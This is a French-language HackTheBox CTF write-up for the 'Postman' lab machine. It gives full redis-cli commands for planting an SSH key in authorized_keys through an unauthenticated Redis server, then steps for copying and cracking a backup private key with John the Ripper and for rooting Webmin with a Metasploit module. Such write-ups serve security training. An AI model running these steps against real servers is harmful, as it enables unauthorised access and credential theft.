@@ -1,0 +1,172 @@
+---
+title: 'HackTheBox - [CTF] Postman'
+summary: "Writeup du CTF Postman de HackTheBox."
+---
+
+![banner](/blog/hackthebox-ctf-postman/banner.png)
+
+Comme toujours avec une nouvelle machine, commençons par énumérer les ports ouverts avec nmap :
+
+![nmap](/blog/hackthebox-ctf-postman/nmap.png)
+
+Le résultat montre qu'il y a un serveur web Apache sur le port 80, mais après analyse et scan,
+on constate qu'il n'y a rien d'intéressant à cet endroit. En revanche, il y a un serveur MiniServ 1.910
+installé sur le port 10000 qui semble intéressant, essayons de l'ouvrir dans le navigateur :
+
+![ssl](/blog/hackthebox-ctf-postman/ssl.png)
+
+Il fonctionne en mode SSL, nous devons donc l'ouvrir avec **https://**.
+
+![webmin](/blog/hackthebox-ctf-postman/webmin.png)
+
+Nous arrivons sur une page d'authentification, il nous faut un nom d'utilisateur et un mot de passe valides pour accéder à l'interface Webmin.
+Il ne semble pas possible d'exploiter quoi que ce soit ici, laissons cela de côté pour l'instant et cherchons autre chose.
+
+Lançons un autre scan nmap pour essayer de trouver des ports ouverts plus élevés :
+
+![nmap](/blog/hackthebox-ctf-postman/nmap2.png)
+
+Intéressant, le port 6379 est ouvert avec **redis** installé dessus. Redis est un système de stockage de structures de données en mémoire open source,
+utilisé comme base de données, cache et courtier de messages, pour plus d'informations sur redis [cliquez ici](https://redis.io/).
+
+Récupérons des informations sur la version de redis utilisée par le serveur.
+
+![redis](/blog/hackthebox-ctf-postman/redis-info.png)
+
+La version de redis installée sur le serveur est la 4.0.9.
+Avec une recherche rapide sur Google, il est facile de trouver un exploit pour cette version de redis,
+[voici](https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html) un exploit d'exécution de commande à distance Redis qui ne nécessite pas d'authentification.
+
+L'objectif de cet exploit est d'écrire notre propre **clé ssh** dans le répertoire du serveur **~/.ssh/authorized_keys**,
+afin de pouvoir accéder directement au serveur via ssh.
+
+D'abord, nous devons générer notre clé ssh :
+
+```shell
+ssh-keygen -t rsa -C "exploit@redis.io"
+```
+
+![ssh key](/blog/hackthebox-ctf-postman/ssh-key.png)
+
+Maintenant que nous avons la clé, nous devons la placer dans la mémoire du serveur Redis, puis la transférer dans un fichier,
+de manière à ce que le fichier authorized_keys résultant soit toujours valide.
+
+Pour ce faire, ajoutons des retours à la ligne avant et après le contenu de la clé ssh publique que nous avons générée :
+
+```shell
+(echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") > foo.txt
+```
+
+Foo.txt contient simplement notre clé ssh publique avec des retours à la ligne. Maintenant nous pouvons écrire cette chaîne dans la mémoire de Redis en utilisant redis-cli.
+
+Commençons par supprimer toutes les clés qui pourraient déjà exister dans la base de données Redis :
+
+```shell
+redis-cli -h 10.10.10.160 flushall
+```
+
+Écrivons maintenant notre clé ssh dans la mémoire redis, nous indiquons à redis de nommer cette clé 'crackit' :
+
+```shell
+cat foo.txt | redis-cli -h 10.10.10.160 -x set crackit
+```
+
+Maintenant que notre clé est dans la mémoire redis, nous devons dumper le contenu de la mémoire dans le fichier **~/.ssh/authorized_keys**.
+Cela peut être fait en définissant d'abord le répertoire de dump de la base de données sur **/var/lib/redis/.ssh**, le répertoire home de redis étant /var/lib/redis.
+
+```shell
+redis-cli -h 10.10.10.160 config set dir /var/lib/redis/.ssh
+```
+
+```shell
+redis-cli -h 10.10.10.160 config get dir
+```
+
+Puis en définissant le nom du fichier de dump de la base de données sur authorized_keys.
+
+```shell
+redis-cli -h 10.10.10.160 config set dbfilename "authorized_keys"
+```
+
+Et enfin en sauvegardant le changement de configuration.
+
+```shell
+redis-cli -h 10.10.10.160 save
+```
+
+![redis cli](/blog/hackthebox-ctf-postman/redis-cli.png)
+
+Parfait, nous pouvons maintenant accéder directement au serveur via ssh en tant qu'utilisateur redis.
+Mais avant de pouvoir nous connecter, nous devons ajouter une configuration dans notre fichier **~/.ssh/config**,
+afin de pouvoir nous connecter avec notre clé ssh au serveur, sans mot de passe de l'utilisateur redis.
+
+Ajoutez cette configuration au fichier config de **.ssh** :
+
+```shell
+Host 10.10.10.160
+    HostName 10.10.10.160
+    User redis
+    IdentityFile /root/Documents/postman/id_rsa
+```
+
+Ensuite, nous devons spécifier notre clé privée lors de l'utilisation de la commande ssh.
+
+```shell
+ssh -i id_rsa redis@10.10.10.160
+```
+
+![shell](/blog/hackthebox-ctf-postman/shell.png)
+
+Nous avons maintenant un accès ssh avec l'utilisateur redis, notre prochain objectif est d'obtenir l'accès à un utilisateur système avec des privilèges plus élevés.
+
+En cherchant dans les différents répertoires du serveur, on peut trouver qu'il y a un utilisateur nommé **Matt** en naviguant
+dans le répertoire **/home**. Et on remarque un fichier de sauvegarde intéressant dans le répertoire **/opt**, le nom du fichier est **id_rsa.bak**.
+On peut deviner par le nom qu'il s'agit d'une sauvegarde d'une clé privée ssh, peut-être la clé privée ssh de Matt...
+
+Transférons ce fichier sur notre ordinateur :
+
+```shell
+scp -i id_rsa redis@10.10.10.160:/opt/id_rsa.bak /root/Documents/postman
+```
+
+Ensuite, utilisons ssh2john pour obtenir le hash de cette clé ssh :
+
+```shell
+ssh2john id_rsa.bak > id_rsa.crack
+```
+
+Et enfin, utilisons JohnTheRipper pour cracker le hash :
+
+```shell
+john --wordlist=/root/Downloads/rockyou.txt id_rsa.crack
+```
+
+![ssh crack](/blog/hackthebox-ctf-postman/ssh-crack.png)
+
+Super ! John a trouvé que la passphrase de la clé est : **computer2008**.
+Essayons donc de nous connecter au serveur ssh avec l'utilisateur Matt en utilisant cette clé.
+
+D'abord, nous devons modifier le fichier de configuration .ssh pour correspondre à cette nouvelle clé, et nous devons changer les permissions du fichier **id_rsa.bak**
+en **600**. Ensuite nous pouvons nous connecter.
+
+```shell
+ssh -i id_rsa.bak Matt@10.10.10.160
+```
+
+Mauvaise nouvelle, on ne peut pas se connecter en ssh avec l'utilisateur Matt... essayons donc avec la commande su.
+
+![matt](/blog/hackthebox-ctf-postman/matt.png)
+
+Bingo ! Nous avons pris le contrôle de l'utilisateur Matt !
+
+Revenons maintenant à la page d'authentification Webmin que nous avons trouvée au début, et essayons de nous connecter avec l'utilisateur Matt.
+
+![webmin matt](/blog/hackthebox-ctf-postman/webmin-matt.png)
+
+Oui, on peut se connecter avec les identifiants de Matt ! Une recherche rapide sur Google et nous voilà avec un exploit d'exécution de commande à distance pour Webmin,
+[voici](https://www.exploit-db.com/exploits/46984) la page de l'exploit. Cet exploit exploite une vulnérabilité dans les pages de mises à jour de paquets de l'interface utilisateur Webmin.
+Utilisons donc ce module metasploit pour obtenir root !
+
+![rooted](/blog/hackthebox-ctf-postman/rooted.png)
+
+BINGO ! Machine rootée !
